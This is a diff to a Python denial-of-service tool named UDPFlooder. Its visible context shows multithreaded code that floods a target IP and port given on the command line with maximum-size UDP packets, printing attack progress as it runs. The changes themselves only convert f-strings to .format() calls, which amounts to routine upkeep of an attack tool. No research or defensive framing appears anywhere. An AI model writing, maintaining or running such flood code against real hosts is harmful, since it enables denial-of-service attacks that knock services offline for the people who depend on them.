@@ -27,7 +27,7 @@ class UDPFlooder:
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             return sock
         except socket.error as e:
-            print(f"Error creating socket: {e}")
+            print("Error creating socket: {}".format(e))
             return None
 
     def generate_packet(self):
@@ -47,7 +47,7 @@ class UDPFlooder:
                     sock.sendto(self.generate_packet(), (self.target_ip, self.target_port))
                     self.sent_packets += 1
                 except socket.error as e:
-                    print(f"Error sending packet: {e}")
+                    print("Error sending packet: {}".format(e))
                     break
         finally:
             sock.close()
@@ -55,8 +55,8 @@ class UDPFlooder:
 
     def start(self):
         threads = []
-        print(f"Starting attack with {self.num_threads} threads")
-        print(f"Using maximum UDP packet size: {self.packet_size} bytes")
+        print("Starting attack with {} threads".format(self.num_threads))
+        print("Using maximum UDP packet size: {} bytes".format(self.packet_size))
         
         for _ in range(self.num_threads):
             thread = threading.Thread(target=self.flood)
@@ -75,15 +75,16 @@ class UDPFlooder:
                 # Get system resource usage
                 cpu_percent = psutil.cpu_percent()
                 memory_percent = psutil.virtual_memory().percent
-                print(f"\rPackets sent: {self.sent_packets} | Elapsed: {elapsed:.1f}s | CPU: {cpu_percent}% | Memory: {memory_percent}%", end="")
+                print("\rPackets sent: {} | Elapsed: {:.1f}s | CPU: {}% | Memory: {}%".format(
+                    self.sent_packets, elapsed, cpu_percent, memory_percent), end="")
         except KeyboardInterrupt:
             print("\nStopping flood...")
             self.running = False
             for thread in threads:
                 thread.join()
         finally:
-            print(f"\nTotal packets sent: {self.sent_packets}")
-            print(f"Average packets per second: {self.sent_packets / self.duration:.2f}")
+            print("\nTotal packets sent: {}".format(self.sent_packets))
+            print("Average packets per second: {:.2f}".format(self.sent_packets / self.duration))
 
 def main():
     parser = ArgumentParser(description="UDP Flooder Tool - Maximum Power Mode")
@@ -95,14 +96,14 @@ def main():
 
     try:
         flooder = UDPFlooder(args.target_ip, args.target_port, args.duration)
-        print(f"Starting UDP flood attack on {args.target_ip}:{args.target_port}")
-        print(f"Duration: {args.duration} seconds")
+        print("Starting UDP flood attack on {}:{}".format(args.target_ip, args.target_port))
+        print("Duration: {} seconds".format(args.duration))
         print("Press Ctrl+C to stop")
         flooder.start()
     except KeyboardInterrupt:
         print("\nAttack stopped by user")
     except Exception as e:
-        print(f"Error: {e}")
+        print("Error: {}".format(e))
 
 if __name__ == "__main__":
     main() 
